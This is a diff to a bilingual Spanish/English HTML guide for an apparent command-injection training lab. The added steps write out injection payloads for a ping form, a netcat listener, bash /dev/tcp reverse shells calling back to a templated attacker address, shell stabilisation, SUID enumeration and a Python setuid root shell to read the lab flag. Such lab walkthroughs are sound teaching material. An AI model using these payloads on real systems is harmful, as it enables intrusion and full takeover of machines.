@@ -26,7 +26,7 @@
   <div class="lang-content" data-lang="es">
     <h3>Pasos de explotación</h3>
     <ol>
-      <li>El campo host se pasa directamente a <code>subprocess.run(shell=True)</code> sin sanitización.</li>
+      <li>El campo host termina dentro de un comando de shell sin sanitización. En Linux, el backend lo ejecuta como <code>alice</code>, así que una reverse shell caerá directamente en <code>/home/alice</code>.</li>
       <li><strong>Easy:</strong> Usa cualquier separador de comandos:
         <pre>127.0.0.1; whoami
 127.0.0.1 && id
@@ -48,7 +48,32 @@ host=127.0.0.1%0aid</pre></li>
       <li>Con curl (el <code>%0a</code> se interpreta como newline en el body):
         <pre>curl -X POST http://TARGET_IP/cmdi/ping \
   -d "host=127.0.0.1%0awhoami"</pre></li>
-      <li>Reverse shell (solo en Easy): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</code></li>
+      <li>Reverse shell para obtener la flag del lab (Easy/Medium):
+        <pre># En Kali, abre un listener:
+rlwrap nc -lvnp 4444
+
+# Easy
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'
+
+# Medium
+127.0.0.1 &amp;&amp; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+      <li>Cuando entre la shell, valida el contexto inicial. Debes aterrizar como <code>alice</code> en su home:
+        <pre>whoami
+pwd
+ls -la
+cat note.txt</pre></li>
+      <li>La shell inicial es una <em>dumb shell</em>. Estabilízala antes de la escalada:
+        <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+reset
+export TERM=xterm
+stty rows 40 cols 120</pre></li>
+      <li>Enumera el vector local de privilegios y eleva a root:
+        <pre>find / -perm -4000 -type f 2&gt;/dev/null
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></li>
+      <li>Ya como root, lee la flag objetivo del lab:
+        <pre>cat /root/root.txt</pre></li>
     </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
@@ -56,7 +81,7 @@ host=127.0.0.1%0aid</pre></li>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Exploitation Steps</h3>
     <ol>
-      <li>The host field is passed directly to <code>subprocess.run(shell=True)</code> without sanitization.</li>
+      <li>The host field ends up inside a shell command without sanitization. On Linux, the backend executes it as <code>alice</code>, so a reverse shell lands directly in <code>/home/alice</code>.</li>
       <li><strong>Easy:</strong> Use any command separator:
         <pre>127.0.0.1; whoami
 127.0.0.1 && id
@@ -78,7 +103,32 @@ host=127.0.0.1%0aid</pre></li>
       <li>With curl (<code>%0a</code> is interpreted as newline in the body):
         <pre>curl -X POST http://TARGET_IP/cmdi/ping \
   -d "host=127.0.0.1%0awhoami"</pre></li>
-      <li>Reverse shell (Easy only): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</code></li>
+      <li>Reverse shell to obtain the lab flag (Easy/Medium):
+        <pre># On Kali, start a listener:
+rlwrap nc -lvnp 4444
+
+# Easy
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'
+
+# Medium
+127.0.0.1 &amp;&amp; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+      <li>When the shell connects back, validate the starting context. You should land as <code>alice</code> in her home directory:
+        <pre>whoami
+pwd
+ls -la
+cat note.txt</pre></li>
+      <li>The initial shell is a <em>dumb shell</em>. Stabilize it before privilege escalation:
+        <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+reset
+export TERM=xterm
+stty rows 40 cols 120</pre></li>
+      <li>Enumerate the local privilege escalation vector and escalate to root:
+        <pre>find / -perm -4000 -type f 2&gt;/dev/null
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></li>
+      <li>Once root, read the target lab flag:
+        <pre>cat /root/root.txt</pre></li>
     </ol>
     <h3>Tools</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
